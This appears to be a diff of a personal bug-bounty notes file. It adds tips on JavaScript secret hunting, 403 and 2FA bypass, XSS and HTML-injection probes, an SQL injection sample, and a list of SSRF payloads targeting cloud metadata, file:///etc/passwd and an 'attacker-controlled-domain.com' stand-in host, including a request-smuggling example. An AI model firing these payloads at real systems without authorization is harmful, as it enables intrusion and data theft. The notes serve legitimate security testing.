@@ -272,10 +272,17 @@ how to use files everywhere
       Javascript Enumeration 
         arjun
       paramspider
-      katana 
+      katana            katana -list {domains.txt} -d 5 -jc | grep ".js$"  | uniq | sort
       hawkrawler
       gosipder
-      
+          
+                  tip
+                  katana -list {domains.txt} -d 5 -jc | grep ".js$"  | uniq | sort
+                  Download SecretFinder (GitHub)
+                  cat {jsfilesgottenfromkatana.txt} | while read url; do python3 SecretFinder/SecretFinder.py  -i $url -o cli; done
+                  If anything sensitive found report it.
+                  
+          
       
   
       # Normal Install
@@ -1069,6 +1076,10 @@ album_id=MyPictures → album_id=12
 
   GET /file?id=90djbkdbkdbd29dd
 GET /file?id=302
+
+  tip
+  Always check the source code   and ctr+f and check for key names and veriables , if the website using userid for verification  create a second account to see if the userid value is similar or not, and check how it generate it
+   Understand how the website works  
 
 
 
@@ -1871,7 +1882,23 @@ To check the randomness of the OTP I decided to send many requests at a time in 
    
    403 BYPASS    403 BYPASS     403 BYPASS
    
+   /// finding hidden parameter /// ///
+   https://medium.com/mii-cybersec/hunting-for-hidden-parameters-in-burp-suite-98b54616f863
+  check for  403 forbidden pages and pages that automatically redirect to another page (300 *** response) and send it to params miner
+  they are four option Guess GET parameters, Guess cookie parameters, Guess headers, and Guess everything. try (Guess GET parameters)or others and press ok
+  go to the  “Extensions” tab on your Burp Suite. Then go to “Installed -> Param Miner -> Output”, parameter should be output
+    check for the paremeters that was found and send it to burp repeter
+    use testbounty to test the request
+    GET ./index.php?note=testbounty Http/2    and check the response                           //note was intended as the param that was found
+    try several injection attacks, such as XSS, SQLI, SSRF, etc
+    
+    
    https://github.com/iamj0ker/bypass-403
+   
+   https://github.com/reinhardt-pwn/Bypass-http         check more on github
+     guide
+     To use this tool, you’ll need to enter the IP of the target (if you only have the DNS address, go to a DNS lookup online), and the path to the Access Denied error.
+     python3 bypass_http.py -i 94.237.62.195 -a /auth/login -p 36517  -v HTTP/1.0
    
    
    
@@ -1979,14 +2006,7 @@ It involves altering the case of characters in the URL path to try and bypass ac
     
     
    
-   
-   
-   
-   
-   
-   
-   
-
+  
    
    2FA BYPASS      2FA BYPASS         2FA BYPASS              2FA BYPASS
    
@@ -2030,7 +2050,7 @@ Cookie: account=victim-user
 verification-code=123456
 [ ] Clickjacking on 2FA Disable Feature
 1. Try to Iframe the page where the application allows a user to disable 2FA
-2. If Iframe is successful, try to perform a social engineering attack to manipulate victim to
+2. If Iframe is successful, try to perform a social engineering attack to manipulate victim to login
 [ ] Response Manipulation
 1. Check Response of the 2FA Request.
 2. If you Observe "Success":false
@@ -2044,6 +2064,7 @@ verification-code=123456
 2. Now, Re-use the 2FA code and if it is used successfully that's an issue.
 3. Also, try requesting multiple 2FA codes and see if previously requested Codes expire or not wh
 4. Also, try to re-use the previously used code after long time duration say 1 day or more. That
+
 [ ] CSRF on 2FA Disable Feature
 1. Request a 2FA code and use it
 2. Now, Re-use the 2FA code and if it is used successfully that's an issue.
@@ -2052,6 +2073,8 @@ expire or not when a new code is requested
 4. Also, try to re-use the previously used code after long time duration say 1 day or
 more. That will be an potential issue as 1 day is enough duration to crack and guess
 a 6-digit 2FA code
+
+
 [ ] Backup Code Abuse
 Apply same techniques used on 2FA such as Response/Status Code Manipulation,
 Brute-force, etc. to bypass Backup Codes and disable/reset 2FA
@@ -2218,6 +2241,16 @@ Payload XSS (cross-site scripting) on login page:
 ');\\</script><script>alert(document.cookie)</script>('%00tst@tst.com.br
 
    `“‘><img src=x onerror=promtp(7)>`”’${{8*8}}      for xss, csti, and html injection
+   
+   
+   tip
+   check which waf is used
+   wafwoof https://url
+   check for basic html injection
+   <h1>test</h1>
+<a>click here</a>
+<title>test</title>  if render, try to excalate to xss
+
 
 
 xss tip
@@ -3130,6 +3163,9 @@ gopherus --exploit [PLATFORM]
 # https://github.com/m4ll0k/Bug-Bounty-Toolz
 # https://github.com/cujanovic/SSRF-Testing
 # https://github.com/bcoles/ssrf_proxy
+https://github.com/blackhatethicalhacking/SSRFPwned
+
+
 
 gau domain.com | python3 ssrf.py collab.listener.com
 
@@ -3139,7 +3175,63 @@ gau domain.com | python3 ssrf.py collab.listener.com
 # SSRF Redirect Payload generator
 # https://tools.intigriti.io/redirector/    
 
+     TOP PAYLOADs
+     // Basic SSRF Payloads:
+Use these payloads to initiate basic SSRF testing by attempting to fetch internal resources.
+http://localhost
+http://127.0.0.1
+http://internal-server
+http://metadata.google.internal/computeMetadata/v1/
+    
+    
+ // File Retrieval Payloads:
+Test SSRF by attempting to read files from the server.
+file:///etc/passwd
+file:///etc/hostname
+file:///etc/hosts
+  
+   // DNS Interaction Payloads:
+Utilize payloads to interact with DNS services and gather information.
+http://attacker-controlled-domain.com
+http://attacker-controlled-domain.com:80
+http://attacker-controlled-domain.com:443
 
+  // HTTP Protocol Abuse:
+Test SSRF by manipulating the protocol and attempting to access internal services.
+ftp://attacker-controlled-domain.com:21/
+
+   // IPv6 Based Payloads:
+Test SSRF vulnerabilities with IPv6 addresses.
+http://[::]:80
+http://[::1]:80
+http://0:0:0:0:0:ffff:7f00:1
+
+// SSRF via Parameter Manipulation:
+Manipulate parameters to test SSRF in URL parsing.
+http://target.com/?url=http://attacker-controlled-domain.com
+http://target.com/?path=http://attacker-controlled-domain.com
+
+  // SSRF via Request Smuggling:
+Explore SSRF vulnerabilities through HTTP request smuggling.
+POST /path HTTP/1.1
+Host: target.com
+Content-Length: 4
+Transfer-Encoding: chunked
+
+0
+
+GET / HTTP/1.1
+Host: attacker-controlled-domain.com
+
+
+//Testing Local Services:
+Test SSRF by targeting common internal services.
+http://127.0.0.1:22
+http://localhost:3306
+http://internal-service.local:8080
+
+
+  
 
 
      Where to Start?
@@ -4214,6 +4306,9 @@ Content-Length: 2
            
            Web Cache poisoning     Web Cache poisoning       Web Cache poisoning 
            
+           check this 
+           https://medium.com/@hbenja47/how-do-i-search-for-web-cache-deception-6c5f318016ca
+           
            
            
        
@@ -5043,127 +5138,56 @@ xss%27;eval.call`${%27alert\x28window.origin\x29%27}`;//
     today=$(date '+%Y-%m-%d'); cat subdomains.txt | httpx -follow-redirects -json -silent | tee active_subdomains_$today.json | jq -r '[.url,.content_length,.title,.host,.status_code] | @csv' | tee urls_modified_raw_$today.csv | anew -d urls_modified_raw_old.csv | cut -d',' -f1 | sed 's/"//g' | ./program active_subdomains_clean_$today.csv active_subdomains_clean_old.csv | tee urls_modified_clean_$today.txt | nuclei -silent -exclude-severity info,low | tee nuclei_urls_modified_$today.txt | notify; cp urls_modified_raw_{$today,old}.csv
 
 
-  API TESTING AND  METHODOLOGY        API TESTING AND  METHODOLOGY        API TESTING AND  METHODOLOGY            API TESTING AND  METHODOLOGY 
-  
-  API documentation is often publicly available, particularly if the API is intended for use by external developers. If this is the case, always start your recon by reviewing the documentation. 
-  
-    
-   if you identify the resource endpoint of /api/swagger/v1/users/123, then you should investigate the following paths:  or fuzz  directly fuzz for documentation. 
-    /api/swagger/v1/users/123,
-    /api/swagger/v1
-    /api/swagger
-    /api
-    
-        /api/tasks 
-    GET /api/tasks - Retrieves a list of tasks.
-    POST /api/tasks - Creates a new task.
-    DELETE /api/tasks/1 - Deletes a task.
-    
-    
-   check for patterns that suggest API endpoints in the URL structure, such as /api/. Also look out for JavaScript files, it could  contain  API endpoints that you haven't triggered directly via the web browse
+            Business Logic Vulnerabilities. Tell signs
 
-    /api/tasks 
-    GET /api/tasks - Retrieves a list of tasks.
-    POST /api/tasks - Creates a new task.
-    DELETE /api/tasks/1 - Deletes a task.
+     Only use feature X to perform function Y.” 
+      “Do not do X with endpoint Y.” 
+     “Only admins should perform request X.”
+     When you attack  their API, make sure to disobey such requests to test for the presence of  security controls.
+     
+     **** ****   ****
+     Improper Assets Management
 
- tip tip
- API endpoints often expect data in a specific format, it may therefore behave differently depending on the content type of the data provided in a request. Changing the content type may enable you to: 
- 
-    Trigger errors that disclose useful information.
-    Bypass flawed defenses.
-    Take advantage of differences in processing logic. For example, an API may be secure when handling JSON data but susceptible to injection attacks when dealing with XML.
+Organizations often include  versioning information in their endpoint names to distinguish between older  and newer versions, such as /v1/, /v2/, /v3/, and so on. APIs still in development often use paths such as /alpha/, /beta/, /test/, /uat/, and /demo/. If you  know that an API is now using apiv3.org/admin but part of the API documentation refers to apiv1.org/admin, you could try testing different endpoints to  see if apiv1 or apiv2 is still active. Additionally, the organization’s changelog  may disclose the reasons why v1 was updated or retired. If you have access  to v1, you can test for those weaknesses.
+Outside of using documentation, you can discover improper assets management vulnerabilities through the use of guessing, fuzzing, or brute-force  requests. Watch for patterns in the API documentation or path-­naming  scheme, and then make requests based on your assumptions.
+   
+   
+     ****  ****
+     The easiest way to discover BFLA is to find administrative API documentation and send requests as an unprivileged user that test admin functions and capabilities.
+     
+    ****  *****
+    You can discover mass assignment vulnerabilities by finding interesting  parameters in API documentation and then adding those parameters to  a request. Look for parameters involved in user account properties, critical functions, and administrative actions
     
-    mass assignment  vuln
-    PATCH REQUEST
     {
-    "username": "smart",
-    "email": "smart@example.com",
-    "isAdmin": false,
+"Fname": "hAPI",
+"Lname": "Hacker",
+"Address": "' OR 1=0--",
 }
- TO  And the watch the behaviour
- {
-    "username": "smart",
-    "email": "smart@example.com",
-    "isAdmin": "foo",
-}
- TO
- {
-    "username": "smart",
-    "email": "smart@example.com",
-    "isAdmin": true,
-}
-  browse the application as smart to see whether you can access admin functionality
 
-NOTE 
-  make sure you are recording all requests and responses. This will help to download and save all the client side code, cookies, and session data while allowing you to collect all the routes, endpoints, parameters, and JSON data to help you get a good picture of what is going on. and it  So important to make sure you click on every link, feature, and function that you can.
-  
-  It’s always a good idea to use the highest tier of the application you are testing and enable all features and functions that you can. This will help expose you to the largest surface area of the application.
-   don’t just assume you’ve seen it all. Always look for indicators of more functionality
-   ****  Check if  removing a paging parameter bring back the entire recordset? Could it make the application unresponsive as it tries to query and pull back all the data? Or does it bring back a known set of data? What if you modify it to bring back an unreasonable number of records? How does that impact application behavior?
-  check  how the application itself handles authentication and authorization 
-  
-  ***Token misuse :  how are API requests authorized? JSON Web Tokens (JWT) or some other opaque data? Are they passed in by an authorization header, some other header, or maybe through a cookie
-  
-  ***Missing or Mismatched AuthZ : use burpsuite  authorize to find this issues, sometimes developers forget to add logic to authorize requests
-  
-  ****Cross Tenant Data Leakage : check using CeWL as  a custom word list generator         //https://danaepp.com/a-cewl-way-for-api-discovery
-           feed cewl to the url , eample below
-           cewl 'https://developer.microsoft.com/en-us/graph/changelog/rss/search=&filterBy=beta,Addition' -m 10 -w graph-beta-adds.txt
-         cewl 'https://developer.microsoft.com/en-us/graph/changelog/rss/?search=&filterBy=beta,Addition,Identity%20and%20access' -m 10 -w graph-beta-iam-adds.txt
-  and then  feed the wordlist to your favorite API discovery bruteforcer like Burp Intruder, feroxbuster, ffuf, gobuster, kiterunner   
-           
-  
-  
-  
-  note: always map how data is passed arround the app, check the structure and schema of objects being passed around. Or how the front end may include logic for input validation that the API itself may not.security controls like rate limiting may impact how much data can be pulled back from an API. Or the fact an API might return too much data that developers may filter out in the front end code, far too late in the process.
-  .......... Discovering the patterns developers use to handle data can help inform how you construct your attack payloads, Watch how data is structured
-  As an example, do they access data through query parameters on a resource like 
-  https://api.example.com/users?name=dana  or do they use a more RESTful URI structure like 
-  https://api.example.com/users/dana    that uses route paths as the params? , check how it handles  json to xml or yaml data
-  
-  
-  ****CRAFT ROGUE API DOCS FOR A TARGET WHEN THEY DON’T EXIST******      https://danaepp.com/how-to-craft-rogue-api-docs-for-a-target-when-they-dont-exist
-  parsing live traffic to and from a web service to  burp and zap
-  and also from dev tools and collect all this traffic and then save it to files for processing later
-  
-tools to check -->  https://github.com/alufers/mitmproxy2swagger
-  steps  
- ***  install https://github.com/alufers/mitmproxy2swagger
- ***  set Once in devtools, make sure you select to “Preserve log” and “Disable cache“ in the network tab, This will ensure you record all requests across pageload
- ***  Use the application normally to collect traffic, sign-up, register,password reset, profile update, possible signup for an account with admin privileges, 
-           if confident that you have figured out everything the application can do, we can start moving towards weaponizing all this data.
- 
- ***  Generate an HTTP Archive (HAR):   use the export tool, which typically looks like a down arrow in devtools 
-       
- ***   Import HAR file to create OpenAPI definition :  leverage mitmproxy2swagger to convert the HAR into a rough OpenAPI definition file
-       example-> mitmproxy2swagger -i crapi.apisec.ai.har -o crapi.yaml -p http://crapi.apisec.ai -e -f har
-       
- ****    Edit the definition files to describe API endpoints
-            Open the YAML definition file in your favorite editor and take a look.
-           Notice you have a ton of lines that start with “- ignore:/” under the x-path-templates. 
-           Go through the file and remove the “ignore:” on any request that appears to be an API call
-           
- *****     Generate OpenAPI documentation from the definition
-             Now run the same command line to execute a second pass against the definition file:
-             mitmproxy2swagger -i crapi.apisec.ai.har -o crapi.yaml -p http://crapi.apisec.ai -e -f har
-               Open up the YAML file again. Look how much it has changed.
-               
- ****      Test the OpenAPI document in Swagger Editor  -->   https://editor.swagger.io
-            Expand any  of the endpoints and take a look at how well defined it is:
-            
-            ***HOW TO USE YOUR ROGUE API DOCS IN POSTMAN ***
-             hook up Postman and BurpSuite together
-             Start up Postman. Click on Workspaces → Create Workspace and name it something unique that represents your engagemen
-             Import OpenAPI definition file
-                On the top left side of the workspace, beside the name you called it, is an Import button. Click that. When prompted use the explorer to 
-                find the YAML file you have created. Then hit the Import button.
-                can start firing off requests! Don’t forget to start up Burp
-                
-            ****   ***    ***
-            With a little effort, you should now have your own custom API documentation that follows the OpenAPI specification. This allows you to use Postman and BurpSuite together to attack the target API with more precision, and allows you to test endpoints that may or may not be know from any existing or old documentation
-            
-            
+Thisbis an example of SQL injection
+  Any response directly from a database  or the supporting system is a clear indicator that there is an injection  vulnerability.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
             
             
             
